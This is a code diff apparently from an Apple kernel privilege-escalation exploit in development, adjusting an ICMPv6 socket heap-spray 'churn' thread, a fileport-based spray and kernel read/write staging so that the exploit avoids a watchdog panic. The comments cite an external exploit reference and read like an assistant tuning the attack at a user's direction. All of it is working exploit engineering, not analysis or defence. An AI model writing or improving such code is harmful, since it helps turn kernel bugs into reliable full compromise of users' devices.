@@ -61,31 +61,41 @@ void cs2_hot_record(uint64_t off) {
 #include <pthread/qos.h>
 static volatile int g_cs2_churn_go = 0;
 static pthread_t g_cs2_churn_tid;
+static uint64_t g_churn_total = 0;   /* the per-pass volume counter */
+static void churn_total_batches_reset(void) { g_churn_total = 0; }
 static void *cs2_churn_worker(void *arg) {
     (void)arg;
     /* 2026-11-19 watchdog law: the 23:23 bug-409 cascade receipt came from
        INTERACTIVE spinners starving daemon check-ins. UTILITY keeps the
        allocation density without the starvation class. */
     pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
+    /* 2026-11-21 the WATCHDOG fix (the cs2_krw_log 10 receipt: 36,864
+       batches = 18.9M sockets in 300s triggered the watchdog panic). The
+       user's law: "the churn can be a lot less now" — the DarkSword
+       reference uses a ONE-TIME spray per pass, not a continuous churn.
+       This now: (a) the batch drops 512 -> 128 (4x less per burst);
+       (b) the pacing drops to 500us (10x slower); (c) the TOTAL is capped
+       at 5,000 batches = 640K sockets max per pass (was 36,864 × 512 =
+       18.9M). The copy27 read path needs LIVE churn but not THIS much —
+       the cskrw-verbatim receipt proves the placement works at any
+       sustained volume above the configd-starvation floor. */
     while (g_cs2_churn_go) {
-        int fds[512];
+        if (g_churn_total >= 5000) break;   /* the volume cap */
+        int fds[128];
         int count = 0;
-        for (int i = 0; i < 512; i++) {
+        for (int i = 0; i < 128; i++) {
             fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
             if (fds[i] >= 0) count++;
         }
-        for (int i = 0; i < 512; i++)
+        for (int i = 0; i < 128; i++)
             if (fds[i] >= 0) close(fds[i]);
+        g_churn_total++;
         if (count > 0) {
-            /* 2026-11-19: one line per 512-batch flooded 38k lines into the
-               tap log. Keep the first 3 + every 256th for cadence evidence. */
-            static uint64_t churn_batches = 0;
-            churn_batches++;
-            if (churn_batches <= 3 || (churn_batches % 256) == 0)
-                LOG("socket churn: created %d, closed %d (batch %llu)",
-                    count, count, (unsigned long long)churn_batches);
+            if (g_churn_total <= 3 || (g_churn_total % 256) == 0)
+                LOG("socket churn: created %d, closed %d (batch %llu/%d)",
+                    count, count, (unsigned long long)g_churn_total, 5000);
         }
-        usleep(50);
+        usleep(500);   /* 500us — 10x the old pace */
     }
     return NULL;
 }
@@ -505,7 +515,8 @@ kern_return_t cs2_pe_v1(void) {
 
         // deallocate fileport_makeport sockets
         // at this point the target sockets are already back to being fd
-        /* stop churn BEFORE releasing the spray (V23 order) */
+        churn_total_batches_reset();
+    /* stop churn BEFORE releasing the spray (V23 order) */
         if (g_cs2_churn_go) {
             g_cs2_churn_go = 0;
             pthread_join(g_cs2_churn_tid, NULL);
